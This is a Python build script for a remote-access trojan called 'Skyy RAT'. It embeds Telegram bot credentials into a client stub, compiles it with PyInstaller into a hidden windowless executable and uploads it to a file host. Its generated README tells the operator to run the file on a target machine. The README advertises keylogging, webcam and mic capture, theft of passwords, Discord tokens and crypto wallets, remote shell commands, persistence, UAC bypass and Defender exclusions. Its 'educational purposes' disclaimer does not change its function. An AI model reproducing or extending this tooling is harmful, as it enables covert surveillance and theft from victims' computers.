#!/usr/bin/env python3
"""
Build Manager for Skyy RAT Builder
Handles PyInstaller compilation and file upload to catbox.moe
"""

import os
import subprocess
import tempfile
import shutil
import asyncio
import aiohttp
import logging
import time
from typing import Dict, List
from pathlib import Path

logger = logging.getLogger(__name__)

class BuildManager:
    def __init__(self):
        self.build_dir = Path("builds")
        self.build_dir.mkdir(exist_ok=True)
        
    async def build_executable(self, bot_token: str, auth_token: str, enabled_commands: List[Dict]) -> Dict:
        """Build the RAT executable with PyInstaller"""
        build_id = f"build_{auth_token}_{int(time.time())}"
        build_path = self.build_dir / build_id

        try:
            # Clean up old builds first to prevent disk space buildup
            self.cleanup_old_builds(max_age_hours=2)  # Clean builds older than 2 hours

            # Create build directory
            build_path.mkdir(exist_ok=True)
            logger.info(f"Created build directory: {build_path}")

            # Generate client stub with enabled commands
            stub_content = self.generate_client_stub(bot_token, auth_token, enabled_commands)
            stub_file = build_path / "client_stub.py"

            with open(stub_file, 'w', encoding='utf-8') as f:
                f.write(stub_content)
            logger.info(f"Generated client stub: {stub_file}")

            # Create requirements file for the stub
            requirements_content = self.get_stub_requirements()
            req_file = build_path / "requirements.txt"

            with open(req_file, 'w') as f:
                f.write(requirements_content)
            logger.info(f"Created requirements file: {req_file}")

            # Verify requirements file was created
            if not req_file.exists():
                return {
                    "success": False,
                    "error": f"Failed to create requirements file: {req_file}"
                }

            # Skip requirements installation for local testing
            # PyInstaller will use globally installed packages
            logger.info("Skipping requirements installation - using global packages")

            # Run PyInstaller build directly (no spec file for simplicity)
            logger.info("Starting PyInstaller build...")
            build_result = await self.run_pyinstaller(build_path, auth_token)

            if build_result["success"]:
                # Debug: List all files in dist directory
                dist_path = build_path / "dist"
                if dist_path.exists():
                    logger.info(f"Files in dist directory:")
                    for file in dist_path.iterdir():
                        logger.info(f"  - {file.name} ({file.stat().st_size} bytes)")
                else:
                    logger.error(f"Dist directory doesn't exist: {dist_path}")

                # Check for any executable files
                possible_files = []
                if dist_path.exists():
                    # Look for any files in dist directory
                    for file in dist_path.iterdir():
                        if file.is_file():
                            possible_files.append(file)

                if possible_files:
                    # Use the first file found (likely the executable)
                    file_path = possible_files[0]
                    file_size = file_path.stat().st_size
                    logger.info(f"Using file: {file_path.name} ({file_size} bytes)")

                    # Create zip file for upload
                    zip_path = build_path / "dist" / f"SkyRAT_{auth_token}.zip"
                    zip_result = self.create_zip_file(file_path, zip_path, auth_token, bot_token, enabled_commands)

                    if zip_result["success"]:
                        # Upload zip to catbox.moe
                        upload_result = await self.upload_to_catbox(zip_path)
                        if upload_result["success"]:
                            logger.info(f"Upload successful! Cleaning up build directory: {build_id}")

                            # Clean up build directory after successful upload
                            self.cleanup_build_files(build_id)

                            return {
                                "success": True,
                                "download_url": upload_result["url"],
                                "file_size": file_size,
                                "auth_token": auth_token,
                                "build_id": build_id
                            }
                        else:
                            logger.error(f"Upload failed, keeping build files for debugging: {upload_result['error']}")
                            return {
                                "success": False,
                                "error": f"Upload failed: {upload_result['error']}"
                            }
                    else:
                        return {
                            "success": False,
                            "error": f"Zip creation failed: {zip_result['error']}"
                        }
                else:
                    logger.error("No files found in dist directory after build")
                    return {
                        "success": False,
                        "error": "No files found after build - PyInstaller may have failed silently"
                    }
            else:
                return {
                    "success": False,
                    "error": f"PyInstaller build failed: {build_result['error']}"
                }

        except Exception as e:
            logger.error(f"Build error: {e}")
            # Clean up on error to prevent disk space buildup
            logger.info(f"Cleaning up failed build: {build_id}")
            self.cleanup_build_files(build_id)
            return {
                "success": False,
                "error": str(e)
            }
            
    def generate_client_stub(self, bot_token: str, auth_token: str, enabled_commands: List[Dict]) -> str:
        """Generate the client stub code"""
        # Debug: Show current working directory and file locations
        current_dir = Path(__file__).parent
        working_dir = Path.cwd()

        logger.info(f"Current working directory: {working_dir}")
        logger.info(f"Script directory: {current_dir}")

        # Try multiple possible locations for the template
        possible_paths = [
            current_dir / "client_stub_template.py",  # Same directory as build_manager.py
            working_dir / "client_stub_template.py",  # Current working directory
            Path("client_stub_template.py"),          # Relative to working directory
        ]

        template_path = None
        for path in possible_paths:
            logger.info(f"Checking template path: {path} (exists: {path.exists()})")
            if path.exists():
                template_path = path
                break

        if template_path is None:
            # List files in current directory for debugging
            logger.error(f"Available files in {working_dir}:")
            for file in working_dir.iterdir():
                logger.error(f"  - {file.name}")
            raise FileNotFoundError(f"Client stub template not found in any of these locations: {possible_paths}")

        logger.info(f"Using template: {template_path}")
        with open(template_path, 'r', encoding='utf-8') as f:
            template = f.read()

        # Replace placeholders (including the quotes in the template)
        enabled_command_names = [cmd['name'] for cmd in enabled_commands]

        replacements = {
            '"{{BOT_TOKEN}}"': f'"{bot_token}"',
            '"{{AUTH_TOKEN}}"': f'"{auth_token}"',
            "{{ENABLED_COMMANDS}}": str(enabled_command_names).replace("'", '"')
        }

        stub_content = template
        for placeholder, value in replacements.items():
            stub_content = stub_content.replace(placeholder, value)

        return stub_content

    async def install_requirements(self, build_path: Path) -> Dict:
        """Install requirements for the build"""
        try:
            req_file = build_path / "requirements.txt"
            libs_dir = build_path / "libs"

            # Verify requirements file exists
            if not req_file.exists():
                return {"success": False, "error": f"Requirements file not found: {req_file}"}

            # Create libs directory
            libs_dir.mkdir(exist_ok=True)

            # Use absolute paths to avoid issues
            cmd = [
                "python", "-m", "pip", "install",
                "-r", str(req_file.absolute()),
                "--target", str(libs_dir.absolute()),
                "--no-deps",  # Don't install dependencies to avoid conflicts
                "--quiet"     # Reduce output
            ]

            logger.info(f"Installing requirements to: {libs_dir}")
            logger.info(f"Command: {' '.join(cmd)}")

            process = await asyncio.create_subprocess_exec(
                *cmd,
                cwd=str(build_path.absolute()),
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await process.communicate()

            stdout_text = stdout.decode() if stdout else ""
            stderr_text = stderr.decode() if stderr else ""

            logger.info(f"Pip stdout: {stdout_text}")
            if stderr_text:
                logger.warning(f"Pip stderr: {stderr_text}")

            if process.returncode == 0:
                logger.info("Requirements installed successfully")
                return {"success": True}
            else:
                error_msg = stderr_text or "Unknown pip error"
                logger.error(f"Requirements installation failed: {error_msg}")
                return {"success": False, "error": error_msg}

        except Exception as e:
            logger.error(f"Requirements installation error: {e}")
            return {"success": False, "error": str(e)}
        
    def generate_pyinstaller_spec(self, auth_token: str) -> str:
        """Generate PyInstaller spec file"""
        spec_content = f"""# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['client_stub.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'telegram',
        'telegram.ext',
        'telegram.constants',
        'telegram.error',
        'PIL',
        'PIL.ImageGrab',
        'PIL.Image',
        'requests',
        'json',
        'base64',
        'sqlite3',
        'asyncio',
        'logging',
        'platform',
        'tempfile',
        'subprocess',
        'time',
        'shutil',
        'datetime',
        'getpass',
        'threading',
        'psutil',
        'httpx',
        'anyio',
        'sniffio',
        'certifi',
        'h11',
        'typing_extensions'
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[
        'matplotlib',
        'numpy',
        'scipy',
        'pandas',
        'tkinter',
        'PyQt5',
        'PyQt6',
        'PySide2',
        'PySide6'
    ],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='SkyRAT_{auth_token}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=False,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    icon=None,
    onefile=True
)
"""
        return spec_content
        
    async def run_pyinstaller(self, build_path: Path, auth_token: str) -> Dict:
        """Run PyInstaller to build executable"""
        try:
            # Use current environment (global packages)
            env = os.environ.copy()

            # Use absolute paths to avoid issues
            abs_build_path = build_path.absolute()
            abs_dist_path = (build_path / "dist").absolute()
            abs_work_path = (build_path / "build").absolute()
            client_stub = (build_path / "client_stub.py").absolute()

            # Create directories
            abs_dist_path.mkdir(exist_ok=True)
            abs_work_path.mkdir(exist_ok=True)

            # Verify client stub exists
            if not client_stub.exists():
                return {"success": False, "error": f"Client stub not found: {client_stub}"}

            # Simplified command for better compatibility on Render
            cmd = [
                "python", "-m", "PyInstaller",
                "--onefile",
                "--clean",
                "--noconfirm",
                "--distpath", str(abs_dist_path),
                "--workpath", str(abs_work_path),
                "--name", f"SkyRAT_{auth_token}",
                str(client_stub)
            ]

            logger.info(f"Build directory: {abs_build_path}")
            logger.info(f"Client stub: {client_stub}")
            logger.info(f"Dist path: {abs_dist_path}")
            logger.info(f"Work path: {abs_work_path}")
            logger.info(f"Running PyInstaller: {' '.join(cmd)}")

            process = await asyncio.create_subprocess_exec(
                *cmd,
                cwd=str(abs_build_path),
                env=env,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            # Add timeout to prevent hanging
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(),
                    timeout=300  # 5 minutes timeout
                )
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return {"success": False, "error": "PyInstaller build timed out after 5 minutes"}

            stdout_text = stdout.decode() if stdout else ""
            stderr_text = stderr.decode() if stderr else ""

            logger.info(f"PyInstaller stdout: {stdout_text}")
            if stderr_text:
                logger.warning(f"PyInstaller stderr: {stderr_text}")

            if process.returncode == 0:
                logger.info("PyInstaller build completed successfully")
                return {"success": True, "output": stdout_text}
            else:
                error_msg = stderr_text or "Unknown PyInstaller error"
                logger.error(f"PyInstaller failed with return code {process.returncode}: {error_msg}")

                # Try fallback: create a simple Python script instead of executable
                logger.info("Attempting fallback: creating Python script instead of executable")
                return await self.create_python_fallback(build_path, auth_token)

        except Exception as e:
            logger.error(f"PyInstaller execution error: {e}")
            # Try fallback on exception
            logger.info("Attempting fallback due to PyInstaller exception")
            return await self.create_python_fallback(build_path, auth_token)

    async def create_python_fallback(self, build_path: Path, auth_token: str) -> Dict:
        """Create a Python script fallback when PyInstaller fails"""
        try:
            logger.info("Creating Python script fallback")

            # Create dist directory
            dist_path = build_path / "dist"
            dist_path.mkdir(exist_ok=True)

            # Copy the client stub as a .py file
            client_stub = build_path / "client_stub.py"
            fallback_file = dist_path / f"SkyRAT_{auth_token}.py"

            if client_stub.exists():
                import shutil
                shutil.copy2(client_stub, fallback_file)

                logger.info(f"Created Python fallback: {fallback_file}")
                return {"success": True, "output": "Python fallback created successfully"}
            else:
                return {"success": False, "error": "Client stub not found for fallback"}

        except Exception as e:
            logger.error(f"Fallback creation error: {e}")
            return {"success": False, "error": f"Fallback failed: {str(e)}"}
            
    async def upload_to_catbox(self, file_path: Path) -> Dict:
        """Upload file to catbox.moe"""
        try:
            # Use requests instead of aiohttp for better compatibility
            import requests

            logger.info(f"Uploading file: {file_path} (size: {file_path.stat().st_size} bytes)")

            with open(file_path, 'rb') as f:
                files = {
                    'fileToUpload': (file_path.name, f, 'application/octet-stream')
                }
                data = {
                    'reqtype': 'fileupload'
                }

                # Add headers to avoid 412 error
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }

                response = requests.post(
                    'https://catbox.moe/user/api.php',
                    files=files,
                    data=data,
                    headers=headers,
                    timeout=60
                )

                logger.info(f"Catbox response status: {response.status_code}")
                logger.info(f"Catbox response text: {response.text}")

                if response.status_code == 200:
                    url = response.text.strip()
                    if url.startswith('https://files.catbox.moe/'):
                        logger.info(f"File uploaded successfully: {url}")
                        return {"success": True, "url": url}
                    else:
                        logger.error(f"Unexpected catbox response: {url}")
                        return {"success": False, "error": f"Upload error: {url}"}
                else:
                    logger.error(f"Catbox upload failed: {response.status_code}")
                    return {"success": False, "error": f"HTTP {response.status_code}: {response.text}"}

        except Exception as e:
            logger.error(f"Catbox upload error: {e}")
            return {"success": False, "error": str(e)}

    def create_readme_content(self, auth_token: str, bot_token: str, enabled_commands: List[Dict]) -> str:
        """Generate README.txt content with instructions"""
        enabled_command_names = [cmd['name'] for cmd in enabled_commands]

        readme_content = f"""
========================================
           SKYY RAT - README
========================================

🎯 AUTHORIZATION TOKEN: {auth_token}

📋 SETUP INSTRUCTIONS:
1. Run the executable on the target machine
2. The RAT will connect automatically to the Telegram bot
3. Send the authorization token when prompted
4. Start controlling the target remotely

🤖 BOT INFORMATION:
Bot Token: {bot_token[:20]}...
Total Commands: {len(enabled_commands)}

⚡ AVAILABLE COMMANDS:
{chr(10).join([f"• {cmd}" for cmd in enabled_command_names])}

🎮 USAGE EXAMPLES:

📸 Take Screenshot:
/ss

💻 Execute Commands:
/cmd dir
/cmd whoami
/cmd ipconfig

📁 File Operations:
/ls
/cd C:\\Users
/remove file.txt
/execute program.exe

🎤 Recording & Keylogging:
/startrecording     - Start mic recording (2min intervals)
/startkeylogger     - Start real-time keylogger
/offlinekeylogger   - Upload saved keylog file
/stoprecording      - Stop recording
/stopkeylogger      - Stop keylogger

🎯 Data Grabbing:
/grab discord       - Grab Discord tokens
/grab passwords     - Grab saved passwords
/grab wallets       - Grab crypto wallets
/grab all          - Grab everything

🔧 System Control:
/listprocesses      - Show running processes
/killprocess 1234   - Kill process by PID
/webcam            - Take webcam photo
/tts Hello World   - Text-to-speech
/blockinput        - Block user input
/disablemonitors   - Turn off monitors

📤 File Upload:
/upload            - Upload files to target

❓ Help:
/help              - Show all available commands

⚠️ IMPORTANT NOTES:
• Keep the authorization token secure
• The RAT runs silently in the background
• Some commands require specific libraries
• Commands will show "not available" if libraries are missing
• The executable has persistence (survives reboots)

🔐 SECURITY FEATURES:
• Password grabbing on first run
• System information collection
• UAC bypass attempts
• Windows Defender exclusions
• Process hiding and duplicate killing

📊 SYSTEM INFORMATION:
The RAT will automatically send system information when it connects:
• Hostname and IP address
• Location (if available)
• Hardware specifications
• Operating system details
• Network information

🎯 STEALTH FEATURES:
• No console window
• Hidden from task manager
• Automatic startup on boot
• Silent operation
• Error handling for stability

========================================
        Skyy RAT - Professional Grade
           Remote Access Tool
========================================

⚠️ DISCLAIMER: For educational and authorized testing purposes only.
Use responsibly and in compliance with applicable laws.
"""
        return readme_content.strip()

    def create_zip_file(self, exe_path: Path, zip_path: Path, auth_token: str, bot_token: str, enabled_commands: List[Dict]) -> Dict:
        """Create a zip file containing the executable and README"""
        try:
            import zipfile

            # Generate README content
            readme_content = self.create_readme_content(auth_token, bot_token, enabled_commands)
            readme_path = exe_path.parent / "README.txt"

            # Write README file
            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write(readme_content)

            # Create zip with both executable and README
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(exe_path, exe_path.name)
                zipf.write(readme_path, "README.txt")

            # Clean up README file
            try:
                readme_path.unlink()
            except:
                pass

            logger.info(f"Created zip file: {zip_path} (size: {zip_path.stat().st_size} bytes)")
            return {"success": True, "zip_path": zip_path}

        except Exception as e:
            logger.error(f"Zip creation error: {e}")
            return {"success": False, "error": str(e)}

    def get_stub_requirements(self) -> str:
        """Get requirements for the client stub"""
        return """python-telegram-bot==21.3
Pillow==10.4.0
requests==2.32.3
psutil==5.9.6"""
        
    def cleanup_build_files(self, build_id: str):
        """Clean up temporary build files"""
        try:
            build_path = self.build_dir / build_id
            if build_path.exists():
                # Calculate size before deletion for logging
                total_size = sum(f.stat().st_size for f in build_path.rglob('*') if f.is_file())
                file_count = len(list(build_path.rglob('*')))

                shutil.rmtree(build_path)
                logger.info(f"Cleaned up build {build_id}: {file_count} files, {total_size:,} bytes freed")
            else:
                logger.warning(f"Build directory not found for cleanup: {build_path}")
        except Exception as e:
            logger.error(f"Error cleaning up build files for {build_id}: {e}")

    def cleanup_old_builds(self, max_age_hours: int = 24):
        """Clean up old build directories to prevent disk space buildup"""
        try:
            if not self.build_dir.exists():
                return

            current_time = time.time()
            cleaned_count = 0

            for build_path in self.build_dir.iterdir():
                if build_path.is_dir():
                    # Check if build is older than max_age_hours
                    build_time = build_path.stat().st_mtime
                    age_hours = (current_time - build_time) / 3600

                    if age_hours > max_age_hours:
                        try:
                            shutil.rmtree(build_path)
                            cleaned_count += 1
                            logger.info(f"Cleaned up old build: {build_path.name} (age: {age_hours:.1f}h)")
                        except Exception as e:
                            logger.error(f"Error cleaning old build {build_path.name}: {e}")

            if cleaned_count > 0:
                logger.info(f"Cleaned up {cleaned_count} old build directories")

        except Exception as e:
            logger.error(f"Error during old build cleanup: {e}")

    def get_build_status(self, build_id: str) -> Dict:
        """Get status of a build"""
        build_path = self.build_dir / build_id
        if not build_path.exists():
            return {"status": "not_found"}

        exe_path = build_path / "dist" / f"SkyRAT_*.exe"
        if any(build_path.glob("dist/SkyRAT_*.exe")):
            return {"status": "completed"}
        elif (build_path / "build").exists():
            return {"status": "building"}
        else:
            return {"status": "preparing"}
